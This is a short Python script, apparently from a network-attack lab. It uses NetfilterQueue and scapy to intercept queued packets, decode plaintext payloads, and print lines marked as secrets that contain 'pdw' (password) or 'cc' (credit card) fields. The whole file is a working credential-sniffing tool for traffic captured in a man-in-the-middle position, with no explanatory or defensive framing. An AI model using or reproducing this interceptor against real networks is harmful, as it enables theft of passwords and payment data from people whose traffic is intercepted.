from netfilterqueue import NetfilterQueue
import scapy.all as scapy
from scapy.layers.inet import IP, TCP


def print_and_accept(packet):
    packet.accept()
    ip = scapy.IP(packet.get_payload())
    if ip.haslayer(scapy.Raw):
        http = ip[scapy.Raw].load.decode()
        secret = http.splitlines()
        secret = [x for x in secret if 'secret' in x]
        if secret != [] and ('pdw --- ' in secret[0] or 'cc --- ' in secret[0]):
            print(secret[0])

nfqueue = NetfilterQueue()
nfqueue.bind(1, print_and_accept)
try:
    nfqueue.run()
except KeyboardInterrupt:
    print('')

nfqueue.unbind()
    